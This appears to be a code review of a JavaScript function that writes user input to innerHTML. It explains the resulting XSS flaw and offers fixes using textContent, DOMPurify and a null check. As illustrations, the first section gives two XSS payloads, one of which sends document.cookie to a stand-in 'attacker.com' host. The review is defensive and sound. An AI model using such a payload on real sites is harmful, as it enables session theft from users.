### Identified Issues & Fixes
---
#### 1. Critical Cross-Site Scripting (XSS) Vulnerability
##### What's Wrong:
The function directly assigns unsanitized user-provided input to `innerHTML`, which will execute any HTML, JavaScript, CSS, or interactive content passed in the `userInput` parameter. This allows attackers to inject malicious code that runs in the context of the victim's browser.
- Example exploits:
  - `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`: Steals the user's session cookies and sends them to an attacker's server
  - `<img src=x onerror="alert('XSS')">`: Triggers arbitrary client-side code execution

##### Fixes:
Choose one of two safe approaches based on your use case:
###### Option A: Plaintext Only (No HTML Allowed)
If you only need to display raw user input without any formatting, replace `innerHTML` with `textContent`, which automatically escapes all HTML special characters to prevent XSS entirely:
```javascript
function renderHTML(userInput) {
  const outputElement = document.getElementById('output');
  if (outputElement) {
    // Automatically escapes all HTML characters
    outputElement.textContent = userInput;
  } else {
    console.warn('Output element with ID "output" not found in the DOM');
  }
}
```

###### Option B: Safe, Limited HTML Allowed
If you need to preserve basic safe HTML markup, use a trusted DOM sanitization library like [DOMPurify](https://github.com/cure53/DOMPurify) to strip out dangerous content while retaining legitimate formatting:
1.  Add DOMPurify to your project via CDN or npm
2.  Updated function:
```javascript
function renderHTML(userInput) {
  const outputElement = document.getElementById('output');
  if (!outputElement) {
    console.warn('Output element with ID "output" not found in the DOM');
    return;
  }
  // Sanitize user input to remove all malicious scripts/content
  const safeInput = DOMPurify.sanitize(userInput);
  outputElement.innerHTML = safeInput;
}
```

---
#### 2. Unhandled Null Reference Error
##### What's Wrong:
If the DOM element with ID `output` does not exist (e.g., typo in the ID, the element loads after this function runs, or the element was removed), `document.getElementById('output')` returns `null`. Attempting to set `null.innerHTML` will throw an uncaught `TypeError`, which halts all subsequent JavaScript execution on the page.

##### Fix:
Add a guard clause to validate the existence of the output element before modifying it, and add a debug warning for easier troubleshooting, as shown in the code examples above.

---
### Additional Improvements
1.  **DOM Readiness Handling**: If this function runs before the full DOM parses (e.g., script tag in the `<head>` without deferral), the output element will not exist. Fix this by either:
    - Adding the `defer` attribute to your script tag: `<script src="your-script.js" defer></script>`
    - Wrapping function calls in a `DOMContentLoaded` event listener
2.  **Type Safety Check**: Add validation to ensure `userInput` is a string to avoid unexpected behavior from non-string inputs:
    ```javascript
    // Add this at the start of the function
    if (typeof userInput !== 'string') {
      userInput = String(userInput);
    }
    ```
